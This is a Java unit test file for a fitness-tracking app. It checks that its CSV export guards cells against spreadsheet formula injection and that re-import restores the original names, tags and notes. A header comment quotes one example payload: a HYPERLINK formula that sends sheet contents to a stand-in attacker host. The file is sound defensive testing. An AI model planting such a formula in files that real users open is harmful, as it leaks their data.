package com.worktrac.backend.export;

import com.worktrac.backend.csvimport.CsvImportParser;
import com.worktrac.backend.csvimport.ParsedImport;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;

// Exercise names, tags and notes are free text a household member typed, and they all land in a
// file opened in Excel, Numbers or Sheets -- which evaluate a cell beginning = + - @ as a FORMULA.
// A name like =HYPERLINK("https://evil.example/?d="&A1,"Click") exfiltrates the sheet to whoever
// opens it, and unlike DDE it does not prompt.
//
// Plain unit test: the escaping is pure string work and the parser touches no database.
//
// The ROUND-TRIP half is the part worth having. Guarding the export without unguarding the import
// would be a quieter bug than the injection it fixes: an exercise genuinely named "-Squat" would
// re-import under a different name, so duplicate detection -- which matches on exact row identity
// -- would stop recognising it, and a re-import would silently create a second exercise plus a full
// set of duplicate rows instead of being the no-op it is supposed to be.
class CsvFormulaInjectionTest {

    private final CsvImportParser parser = new CsvImportParser();

    private String roundTripExerciseName(String exportedCell) {
        ParsedImport parsed = parser.parse("Exercise,Date,Reps\n" + exportedCell + ",2026-01-15,5", "lb");
        return parsed.sessions().get(0).rows().get(0).exerciseName();
    }

    // ── Export side ────────────────────────────────────────────────────────────────────────────

    @Test
    void aValueStartingWithATriggerIsGuardedAndQuoted() {
        assertEquals("\"'=1+1\"", CsvExportService.csvEscape("=1+1"));
        assertEquals("\"'-Squat\"", CsvExportService.csvEscape("-Squat"));
        assertEquals("\"'+Row\"", CsvExportService.csvEscape("+Row"));
        assertEquals("\"'@Curl\"", CsvExportService.csvEscape("@Curl"));
    }

    @Test
    void anOrdinaryValueIsUntouched() {
        assertEquals("Bench Press", CsvExportService.csvEscape("Bench Press"));
    }

    @Test
    void quotingRulesStillApply() {
        assertEquals("\"a,b\"", CsvExportService.csvEscape("a,b"));
        assertEquals("\"say \"\"hi\"\"\"", CsvExportService.csvEscape("say \"hi\""));
    }

    // A bare carriage return breaks row structure exactly as a newline does, and was missing from
    // the quoting condition entirely.
    @Test
    void aCarriageReturnIsQuoted() {
        assertEquals("\"a\rb\"", CsvExportService.csvEscape("a\rb"));
    }

    @Test
    void nullBecomesAnEmptyCell() {
        assertEquals("", CsvExportService.csvEscape(null));
    }

    // ── Round trip ─────────────────────────────────────────────────────────────────────────────

    @Test
    void aGuardedNameComesBackAsTheOriginal() {
        assertEquals("-Squat", roundTripExerciseName("\"'-Squat\""));
        assertEquals("=1+1", roundTripExerciseName("\"'=1+1\""));
    }

    // Only stripped when what FOLLOWS is itself a trigger, so an apostrophe someone actually typed
    // survives untouched.
    @Test
    void anApostropheSomeoneActuallyTypedSurvives() {
        assertEquals("'til failure", roundTripExerciseName("'til failure"));
        assertEquals("Bob's Curl", roundTripExerciseName("Bob's Curl"));
    }

    @Test
    void anOrdinaryNameRoundTripsUnchanged() {
        assertEquals("Bench Press", roundTripExerciseName("Bench Press"));
    }

    // Per entry, not on the whole cell: the exporter joins tags with "; " AFTER guarding each one.
    @Test
    void guardedTagsAreUnguardedPerEntry() {
        ParsedImport parsed = parser.parse(
                "Exercise,Date,Reps,Tags\nSquat,2026-01-15,5,\"'-legs; '=push; chest\"", "lb");
        assertEquals(List.of("-legs", "=push", "chest"), parsed.sessions().get(0).rows().get(0).tags());
    }

    @Test
    void guardedNotesAreUnguarded() {
        ParsedImport parsed = parser.parse(
                "Exercise,Date,Reps,Exercise Note\nSquat,2026-01-15,5,\"'-go light\"", "lb");
        assertEquals("-go light", parsed.sessions().get(0).rows().get(0).exerciseNote());
    }

    // Whatever the exporter guards, the importer must unguard -- the two constants are separate
    // copies, so this is what stops them drifting.
    @Test
    void everyGuardedTriggerRoundTrips() {
        for (char trigger : CsvExportService.FORMULA_TRIGGERS.toCharArray()) {
            if (trigger == '\r' || trigger == '\t') {
                continue; // whitespace triggers are a row-structure concern, covered above
            }
            String name = trigger + "x";
            assertEquals(name, roundTripExerciseName(CsvExportService.csvEscape(name)),
                    "trigger '" + trigger + "' must survive export -> import");
        }
    }
}
